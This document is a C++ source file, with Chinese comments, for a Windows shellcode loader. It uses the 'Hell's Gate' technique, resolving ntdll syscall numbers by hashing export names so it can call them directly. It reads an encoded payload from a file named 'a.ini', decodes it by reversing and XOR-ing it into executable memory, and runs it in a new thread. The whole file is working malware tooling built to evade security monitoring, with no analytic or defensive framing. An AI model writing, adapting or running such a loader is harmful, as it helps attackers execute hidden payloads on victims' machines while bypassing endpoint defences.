#include <Windows.h>
#include <stdio.h>
#include <cstdlib>


#pragma warning(disable:4996)
extern "C" VOID HellsGate(WORD wIndex);
extern "C" VOID HellsCall(...);
typedef DWORD (*_GetHash)(PCHAR);


ULONGLONG GetNtDllAddress() {

	ULONGLONG ullNtdll = 0;
	_TEB* pTeb = NtCurrentTeb();
	PULONGLONG pPeb = (PULONGLONG) * (PULONGLONG)((ULONGLONG)pTeb + 0x60); //解引用
	PULONGLONG pLdr = (PULONGLONG) * (PULONGLONG)((ULONGLONG)pPeb + 0x18); //解引用
	PULONGLONG pInLoadOrderModuleList = (PULONGLONG)((ULONGLONG)pLdr + 0x10);
	PULONGLONG pModuleExe = (PULONGLONG)*pInLoadOrderModuleList;
	PULONGLONG pModuleNtdll = (PULONGLONG)*pModuleExe;
	ullNtdll = pModuleNtdll[6];
	return ullNtdll;
}

DWORD GetNtProcIndex(DWORD FuncHash) {
	ULONGLONG ullBase = GetNtDllAddress();
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ullBase;
	PIMAGE_NT_HEADERS64 pNt = (PIMAGE_NT_HEADERS64)(pDos->e_lfanew + ullBase);
	PIMAGE_DATA_DIRECTORY pExprotDir = pNt->OptionalHeader.DataDirectory;
	pExprotDir = &pExprotDir[IMAGE_DIRECTORY_ENTRY_EXPORT];
	DWORD dwOffset = pExprotDir->VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(ullBase + dwOffset);

	DWORD dwFunCount = pExport->NumberOfFunctions;
	DWORD dwFunNameCount = pExport->NumberOfNames;

	PDWORD pEat = (PDWORD)(ullBase + pExport->AddressOfFunctions);//导出函数地址表
	PDWORD pEnt = (PDWORD)(ullBase + pExport->AddressOfNames);//导出函数名称表
	PWORD pEit = (PWORD)(ullBase + pExport->AddressOfNameOrdinals);//导出函数序号表

	for (size_t i = 0; i < dwFunCount; i++)
	{

		if (!pEat[i])
		{
			continue;
		}
		ULONGLONG ullFunAddrOffset = pEat[i];
		for (size_t index = 0; index < dwFunNameCount; index++)
		{
			if (pEit[index] == i)
			{
				ULONGLONG ullFunNameOffset = pEnt[index];
				PCHAR pFunName = (PCHAR)(ullBase + ullFunNameOffset);
				//计算hash
				DWORD digest = 0;
				while (*pFunName)
				{
					digest = ((digest << 25) | (digest >> 7));
					digest += *pFunName;
					pFunName++;

				}
				if (FuncHash == digest)
				{
					return *((UCHAR*)(ullBase + ullFunAddrOffset) + 0x4);
				}
			}
		}
	}

}

LPVOID DeAddress = NULL;
LPVOID ScAddress = NULL;
VOID DeShellcode() {



	char a[] = { 'a' ,'.','i','n','i' };


	HANDLE hProcess = GetCurrentProcess();

	FILE* file1 = fopen(a, "rb");
	if (file1 == NULL) {
		perror("Error opening file");
		return;
	}

	fseek(file1, 0, SEEK_END);
	DWORD nFileSize = ftell(file1);

	fseek(file1, 0, SEEK_SET);
	SIZE_T DeSize = nFileSize;
	SIZE_T ScSize = nFileSize;
	DWORD NtAllocateVirtualMemory = GetNtProcIndex(0x014044ae);
	HellsGate(NtAllocateVirtualMemory); //初始化标志
	HellsCall(hProcess, &DeAddress, 0, &DeSize, MEM_COMMIT, PAGE_READWRITE);
	HellsCall(hProcess, &ScAddress, 0, &ScSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	printf("DeAddress:%p\n", DeAddress);
	printf("ScAddress:%p\n", ScAddress);

	if (DeAddress == NULL) {
		perror("Error allocating memory");
		fclose(file1);
		return;
	}

	fread(DeAddress, 1, nFileSize, file1);
	fclose(file1);



	//system("pause");
	//DWORD ZwFreeVirtualMemory = GetNtProcIndex(0xe584c0de);
	//HellsGate(ZwFreeVirtualMemory);
	//HellsCall(hProcess, &DeAddress, &DeSize, MEM_DECOMMIT);

	//ScSize = nFileSize;
	//ULONG oldprotect = 0;
	//DWORD NtProtectVirtualMemory = GetNtProcIndex(0xe67c7320);
	//HellsGate(NtProtectVirtualMemory);
	//HellsCall(hProcess, &ScAddress, &ScSize, PAGE_EXECUTE_READWRITE,&oldprotect);
	//printf("%d\n", oldprotect);
	size_t Re = nFileSize % 2 + nFileSize / 2;

	for (size_t i = 0; i < nFileSize; i++)
	{
		if (i < Re)
		{
			((char*)ScAddress)[i] = ((char*)DeAddress)[Re - i - 1];
		}
		else
		{
			((char*)ScAddress)[i] = ((char*)DeAddress)[i];
		}
	}
	for (size_t i = 0; i < nFileSize; i++)
	{
		((char*)ScAddress)[i] ^= (i + 1);
	}


	DWORD ZwFreeVirtualMemory = GetNtProcIndex(0xe584c0de);
	HellsGate(ZwFreeVirtualMemory);
	HellsCall(hProcess, &DeAddress, &ScSize, MEM_DECOMMIT);
	//((void(*)())ScAddress)();
	HANDLE hThread;
	DWORD NtCreateThreadEx = GetNtProcIndex(0x93ec9d3d);
	HellsGate(NtCreateThreadEx); //初始化标志
	HellsCall(&hThread, PROCESS_ALL_ACCESS, NULL, hProcess, ScAddress, 0, 0, 0, 0, 0, NULL);


	DWORD NtWaitForSingleObject = GetNtProcIndex(0xc6f6afcd);
	HellsGate(NtWaitForSingleObject);
	HellsCall(hThread, FALSE, NULL);



}


int main() {



	DeShellcode();


	return 0;

}